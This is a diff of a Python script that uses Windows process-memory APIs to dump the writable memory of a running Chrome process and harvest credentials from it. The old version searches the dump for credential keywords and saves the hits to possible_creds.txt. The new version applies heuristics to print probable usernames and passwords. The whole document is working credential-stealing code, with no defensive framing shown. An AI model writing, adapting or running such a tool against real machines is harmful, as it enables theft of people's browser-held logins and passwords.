@@ -1,109 +1,109 @@
 import ctypes
-import psutil
+import ctypes.wintypes as wintypes
 import re
-import os
-from ctypes import wintypes
-import time
+import sys
 
-# Constants
 PROCESS_ALL_ACCESS = 0x1F0FFF
-CHROME_EXE = "chrome.exe"
-
-# Windows API setup
-kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-
-OpenProcess = kernel32.OpenProcess
-ReadProcessMemory = kernel32.ReadProcessMemory
-VirtualQueryEx = kernel32.VirtualQueryEx
-CloseHandle = kernel32.CloseHandle
-
 MEM_COMMIT = 0x1000
 PAGE_READWRITE = 0x04
 
+OpenProcess = ctypes.windll.kernel32.OpenProcess
+OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+OpenProcess.restype = wintypes.HANDLE
+
+ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory
+ReadProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
+ReadProcessMemory.restype = wintypes.BOOL
+
+VirtualQueryEx = ctypes.windll.kernel32.VirtualQueryEx
+VirtualQueryEx.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, ctypes.POINTER(wintypes.MEMORY_BASIC_INFORMATION), ctypes.c_size_t]
+VirtualQueryEx.restype = ctypes.c_size_t
+
+CloseHandle = ctypes.windll.kernel32.CloseHandle
+CloseHandle.argtypes = [wintypes.HANDLE]
+CloseHandle.restype = wintypes.BOOL
+
 class MEMORY_BASIC_INFORMATION(ctypes.Structure):
     _fields_ = [
-        ('BaseAddress',       ctypes.c_void_p),
-        ('AllocationBase',    ctypes.c_void_p),
-        ('AllocationProtect', wintypes.DWORD),
-        ('RegionSize',        ctypes.c_size_t),
-        ('State',             wintypes.DWORD),
-        ('Protect',           wintypes.DWORD),
-        ('Type',              wintypes.DWORD),
+        ("BaseAddress", wintypes.LPVOID),
+        ("AllocationBase", wintypes.LPVOID),
+        ("AllocationProtect", wintypes.DWORD),
+        ("RegionSize", ctypes.c_size_t),
+        ("State", wintypes.DWORD),
+        ("Protect", wintypes.DWORD),
+        ("Type", wintypes.DWORD),
     ]
 
-def get_chrome_pid():
-    for proc in psutil.process_iter(['pid', 'name']):
-        if proc.info['name'] == CHROME_EXE:
-            return proc.info['pid']
-    return None
+def extract_ascii_strings(data, min_len=3):
+    pattern = re.compile(rb'[\x20-\x7E]{%d,}' % min_len)
+    return [match.decode('ascii') for match in pattern.findall(data)]
 
-def dump_memory(pid):
+def looks_like_password(s):
+    if len(s) < 6 or len(s) > 50:
+        return False
+    has_lower = any(c.islower() for c in s)
+    has_upper = any(c.isupper() for c in s)
+    has_digit = any(c.isdigit() for c in s)
+    has_special = any(not c.isalnum() for c in s)
+    return has_digit and (has_lower or has_upper) and has_special
+
+def looks_like_username(s):
+    if len(s) < 3 or len(s) > 50:
+        return False
+    if '@' in s and '.' in s:
+        return True
+    if s.isalnum() and 3 <= len(s) <= 30:
+        return True
+    return False
+
+def read_process_memory_strings(pid):
     process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
     if not process_handle:
-        raise Exception("Could not open process. Try running as Administrator.")
+        print(f"[-] Could not open process {pid}")
+        return []
 
     address = 0
-    memory_dump = b""
+    max_address = 0x7FFFFFFF  # 32-bit process; adjust for 64-bit
+    strings = []
 
     mbi = MEMORY_BASIC_INFORMATION()
-    mbi_size = ctypes.sizeof(mbi)
-
-    while VirtualQueryEx(process_handle, ctypes.c_void_p(address), ctypes.byref(mbi), mbi_size):
-        if mbi.State == MEM_COMMIT and mbi.Protect == PAGE_READWRITE:
-            buffer = ctypes.create_string_buffer(mbi.RegionSize)
-            bytesRead = ctypes.c_size_t(0)
-
-            if ReadProcessMemory(process_handle, ctypes.c_void_p(address), buffer, mbi.RegionSize, ctypes.byref(bytesRead)):
-                memory_dump += buffer.raw[:bytesRead.value]
-
-        address += mbi.RegionSize
+    while address < max_address:
+        if VirtualQueryEx(process_handle, ctypes.c_void_p(address), ctypes.byref(mbi), ctypes.sizeof(mbi)):
+            if mbi.State == MEM_COMMIT and (mbi.Protect & PAGE_READWRITE):
+                buffer = ctypes.create_string_buffer(mbi.RegionSize)
+                bytesRead = ctypes.c_size_t()
+                if ReadProcessMemory(process_handle, ctypes.c_void_p(address), buffer, mbi.RegionSize, ctypes.byref(bytesRead)):
+                    region_data = buffer.raw[:bytesRead.value]
+                    region_strings = extract_ascii_strings(region_data, min_len=3)
+                    strings.extend(region_strings)
+            address += mbi.RegionSize
+        else:
+            break
 
     CloseHandle(process_handle)
-    return memory_dump
-
-def extract_utf16le_strings(data, min_length=6):
-    pattern = re.compile((b'(?:[\x20-\x7E]\x00){%d,}' % min_length))
-    return [match.decode('utf-16le') for match in pattern.findall(data)]
-
-def save_to_file(strings, filename):
-    with open(filename, 'w', encoding='utf-8') as f:
-        for s in strings:
-            f.write(s + '\n')
-
-def filter_creds(strings):
-    possible_creds = []
-    for s in strings:
-        if any(x in s.lower() for x in ['username', 'password', '@', '.com', 'login']) and len(s) > 6:
-            possible_creds.append(s)
-    return possible_creds
+    return strings
 
 def main():
-    pid = get_chrome_pid()
-    if not pid:
-        print("[!] Chrome is not running.")
-        return
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <chrome_pid>")
+        sys.exit(1)
 
-    print(f"[+] Found Chrome PID: {pid}")
-    print("[*] Taking memory dump...")
-    dump = dump_memory(pid)
-    print(f"[+] Memory dump completed. Size: {len(dump)} bytes")
+    pid = int(sys.argv[1])
+    print(f"[+] Reading memory of process PID {pid}")
 
-    print("[*] Extracting UTF-16LE strings...")
-    strings = extract_utf16le_strings(dump)
-    print(f"[+] Found {len(strings)} strings.")
+    all_strings = read_process_memory_strings(pid)
+    print(f"[+] Extracted {len(all_strings)} candidate strings")
 
-    print("[*] Filtering possible credentials...")
-    creds = filter_creds(strings)
+    usernames = set(filter(looks_like_username, all_strings))
+    passwords = set(filter(looks_like_password, all_strings))
 
-    if creds:
-        print("[+] Possible credentials found:\n")
-        for c in creds:
-            print(f"    {c}")
-    else:
-        print("[-] No credential-like strings found.")
+    print(f"[+] Possible usernames ({len(usernames)}):")
+    for u in usernames:
+        print("  ", u)
 
-    save_to_file(creds, "possible_creds.txt")
-    print("[*] Saved to possible_creds.txt")
+    print(f"[+] Possible passwords ({len(passwords)}):")
+    for p in passwords:
+        print("  ", p)
 
 if __name__ == "__main__":
     main()
